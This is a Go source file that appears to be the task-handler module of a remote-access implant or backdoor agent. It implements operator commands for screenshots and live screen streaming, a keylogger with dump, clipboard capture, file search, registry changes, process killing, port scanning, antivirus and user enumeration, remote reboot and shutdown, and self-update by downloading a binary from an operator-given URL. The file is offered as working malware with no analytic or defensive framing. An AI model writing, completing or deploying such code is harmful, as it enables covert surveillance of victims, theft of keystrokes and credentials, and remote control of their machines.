//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"os"
	"runtime"
	"strings"
	"time"
)

// ── Screenshot / Screen Stream ──────────────────────────────────────────

func handleScreenshot(task Task, res *TaskResult) {
	data, err := takeScreenshot()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(data)
		res.Encoding = "base64"
		res.Size = int64(len(data))
		inFastMode = true
	}
}

func handleScreenStreamStart(task Task, res *TaskResult) {
	if !screenStreaming {
		screenStreaming = true
		go func() {
			for screenStreaming {
				data, err := takeScreenshotJPEG(65)
				if err == nil {
					sendScreenFrame(data)
				}
				time.Sleep(150 * time.Millisecond)
			}
		}()
	}
	res.Output = "screen stream started"
}

func handleScreenStreamStop(task Task, res *TaskResult) {
	screenStreaming = false
	res.Output = "screen stream stopped"
}

func handleScreenshotWindow(task Task, res *TaskResult) {
	data, err := takeScreenshot()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(data)
		res.Encoding = "base64"
		res.Size = int64(len(data))
	}
}

// ── Keylogger ───────────────────────────────────────────────────────────

func handleKeyloggerStart(task Task, res *TaskResult) {
	if !keylogActive {
		keylogActive = true
		go keyloggerLoop()
	}
	res.Output = "keylogger started"
}

func handleKeyloggerStop(task Task, res *TaskResult) {
	keylogActive = false
	res.Output = "keylogger stopped"
}

func handleKeyloggerDump(task Task, res *TaskResult) {
	keylogMu.Lock()
	data := keylogBuffer.String()
	keylogBuffer.Reset()
	keylogMu.Unlock()
	if data == "" {
		res.Output = "(no keys logged yet)"
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(data))
		res.Encoding = "base64"
	}
}

// ── Process ─────────────────────────────────────────────────────────────

func handleSuspend(task Task, res *TaskResult) {
	out, err := suspendProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleResume(task Task, res *TaskResult) {
	out, err := resumeProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleKillProc(task Task, res *TaskResult) {
	out, err := killProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

// ── Clipboard ───────────────────────────────────────────────────────────

func handleClipboardGet(task Task, res *TaskResult) {
	out, err := clipboardGet()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleClipboardSet(task Task, res *TaskResult) {
	err := clipboardSet(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "clipboard set"
	}
}

// ── Search / Registry ───────────────────────────────────────────────────

func handleFind(task Task, res *TaskResult) {
	out, err := findFiles(task.Path, task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleRegGet(task Task, res *TaskResult) {
	out, err := regGet(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleRegSet(task Task, res *TaskResult) {
	err := regSet(task.Path, task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "reg set"
	}
}

func handleRegDelete(task Task, res *TaskResult) {
	err := regDelete(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "reg deleted"
	}
}

// ── Recon ───────────────────────────────────────────────────────────────

func handlePortscan(task Task, res *TaskResult) {
	out, err := portScan(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleNetstat(task Task, res *TaskResult) {
	out, err := netStat()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleUsers(task Task, res *TaskResult) {
	out, err := listUsers()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleAV(task Task, res *TaskResult) {
	out, err := detectAV()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleServices(task Task, res *TaskResult) {
	out, err := listServices()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

// ── System ──────────────────────────────────────────────────────────────

func handleReboot(task Task, res *TaskResult) {
	cmdStr := "shutdown /r /t 0"
	if runtime.GOOS != "windows" {
		cmdStr = "reboot"
	}
	out, err := runShell(cmdStr, "")
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "reboot initiated: " + out
	}
}

func handleShutdown(task Task, res *TaskResult) {
	cmdStr := "shutdown /s /t 0"
	if runtime.GOOS != "windows" {
		cmdStr = "shutdown -h now"
	}
	out, err := runShell(cmdStr, "")
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "shutdown initiated: " + out
	}
}

func handleDrives(task Task, res *TaskResult) {
	out, err := listDrives()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleBeaconNow(task Task, res *TaskResult) {
	res.Output = "beacon forced"
}

func handleUninstall(task Task, res *TaskResult) {
	out, err := uninstallSelf()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleKill(task Task, res *TaskResult) {
	res.Output = "Agent terminating..."
	sendTaskResult(*res)
	time.Sleep(300 * time.Millisecond)
	os.Exit(0)
}

func handleSelfUpdate(task Task, res *TaskResult) {
	url := task.Command
	if url == "" {
		res.Error = "self_update: download URL required"
		return
	}
	result := selfUpdate(url)
	if strings.HasPrefix(result, "failed") {
		res.Error = result
	} else {
		res.Output = result
		sendTaskResult(*res)
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}
}
